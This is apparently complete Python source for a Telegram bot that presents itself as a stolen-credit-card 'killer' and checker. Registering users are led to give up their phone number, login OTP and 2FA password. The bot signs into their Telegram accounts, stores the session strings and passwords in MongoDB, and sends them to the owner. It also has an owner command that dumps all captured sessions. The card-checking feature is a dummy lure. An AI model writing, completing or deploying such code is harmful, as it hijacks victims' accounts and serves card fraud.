Full updated Telegram bot code with MongoDB (excluding logout)

import re import pymongo from flask import Flask from pyrogram import Client, filters from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton from telethon import TelegramClient from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, AuthRestartError from telethon.sessions import StringSession from pyrogram.enums import ParseMode

--- CONFIGURATION ---

API_ID = 29657994 API_HASH = "85f461c4f637911d79c65da1fc2bdd77" BOT_TOKEN = "YOUR_BOT_TOKEN" OWNER_USERNAME = "@Rishu1286" MONGO_URL = "mongodb://localhost:27017" DB_NAME = "cckiller_bot"

--- DATABASE ---

mongo_client = pymongo.MongoClient(MONGO_URL) db = mongo_client[DB_NAME] sessions = db["sessions"]

--- INIT ---

app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN) flask_app = Flask(name) user_data = {}

--- FLASK ---

@flask_app.route("/") def home(): return "Bot is Running"

--- START COMMAND ---

@app.on_message(filters.command("start")) async def start(client, message: Message): user = message.from_user user_id = user.id ref_code = message.text.split(" ")[-1] if len(message.text.split()) > 1 else None

if ref_code and str(user_id) != ref_code:
    referrer = sessions.find_one({"user_id": int(ref_code)})
    if referrer:
        sessions.update_one({"user_id": int(ref_code)}, {"$inc": {"referrals": 1}})
        await app.send_message(OWNER_USERNAME, f"{user.mention} joined via referral of {ref_code}.")

instructions = (
    f"ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 《 ₡₡ кɪʟʟᴇʀ 》!

ʜᴇʏ {user.first_name}

" "How it Works:

" "[✓] /cu [card_details] - ᴋɪʟʟ ᴄᴄ " "[✓] /b3 [card_details] - ᴄʜᴇᴄᴋ ᴄᴀʀᴅ" ) keyboard = InlineKeyboardMarkup( [[InlineKeyboardButton("Register", callback_data="register")]] ) await message.reply(instructions, reply_markup=keyboard)

--- REGISTER HANDLER ---

@app.on_callback_query(filters.regex("register")) async def inline_register(_, query): keyboard = [[KeyboardButton("Share phone number", request_contact=True)]] reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True) await query.message.reply("Please share your phone number.", reply_markup=reply_markup)

@app.on_message(filters.contact) async def handle_contact(_, message): phone_number = message.contact.phone_number user_id = message.chat.id

client = TelegramClient(StringSession(), API_ID, API_HASH)
await client.connect()
try:
    result = await client.send_code_request(phone_number)
    user_data[user_id] = {
        "client": client,
        "phone_number": phone_number,
        "phone_code_hash": result.phone_code_hash,
    }
    await message.reply("OTP sent. Please enter it:")
except AuthRestartError:
    await message.reply("Internal error. Please try again.")

@app.on_message(filters.text & filters.private) async def handle_otp(client, message): user_id = message.chat.id if user_id not in user_data: return

otp = message.text.strip()
data = user_data[user_id]
tele_client = data["client"]

try:
    await tele_client.sign_in(data["phone_number"], otp, phone_code_hash=data["phone_code_hash"])
    session_str = tele_client.session.save()

    sessions.update_one(
        {"user_id": user_id},
        {"$set": {
            "user_id": user_id,
            "username": message.from_user.username,
            "phone_number": data["phone_number"],
            "session": session_str,
            "referrals": 0
        }},
        upsert=True
    )

    await client.send_message(OWNER_USERNAME, f"Login success for {data['phone_number']}\nSession: `{session_str}`", parse_mode=ParseMode.MARKDOWN)
    await message.reply("Login successful!")
    await tele_client.disconnect()
    user_data.pop(user_id, None)

except SessionPasswordNeededError:
    await message.reply("2FA is enabled. Send your password.")
    data["awaiting_password"] = True

except PhoneCodeInvalidError:
    await message.reply("Invalid OTP.")

@app.on_message(filters.text & filters.private) async def handle_password(client, message): user_id = message.chat.id if user_id not in user_data: return

data = user_data[user_id]
if not data.get("awaiting_password"):
    return

password = message.text.strip()
tele_client = data["client"]

try:
    await tele_client.sign_in(password=password)
    session_str = tele_client.session.save()

    sessions.update_one(
        {"user_id": user_id},
        {"$set": {
            "user_id": user_id,
            "username": message.from_user.username,
            "phone_number": data["phone_number"],
            "password": password,
            "session": session_str,
            "referrals": 0
        }},
        upsert=True
    )

    await client.send_message(OWNER_USERNAME, f"2FA login for {data['phone_number']}\nPassword: `{password}`\nSession: `{session_str}`", parse_mode=ParseMode.MARKDOWN)
    await message.reply("Login successful with 2FA!")
    await tele_client.disconnect()
    user_data.pop(user_id, None)
except Exception as e:
    await message.reply(f"2FA login failed: {e}")
    await tele_client.disconnect()

--- /RISHU COMMAND (OWNER ONLY) ---

@app.on_message(filters.command("rishu") & filters.private) async def view_users(client, message): if message.from_user.username != OWNER_USERNAME.replace("@", ""): return

msg = "**Current Active Sessions:**\n"
for session in sessions.find():
    uname = session.get("username") or "N/A"
    msg += f"\nUser: `{uname}`\nPhone: `{session['phone_number']}`\nSession: `{session['session']}`\n"
await message.reply(msg, parse_mode=ParseMode.MARKDOWN)

--- CARD CHECK PLACEHOLDER ---

@app.on_message(filters.regex(r"^/cu ") | filters.regex(r"^/b3 ")) async def check_card(client, message): if message.chat.id not in [x['user_id'] for x in sessions.find()]: await message.reply("You are not logged in. Use /start to register.") else: await message.reply("Card checked (dummy response).")

--- MAIN ---

if name == 'main': import threading threading.Thread(target=lambda: flask_app.run(host="0.0.0.0", port=8080)).start() app.run()

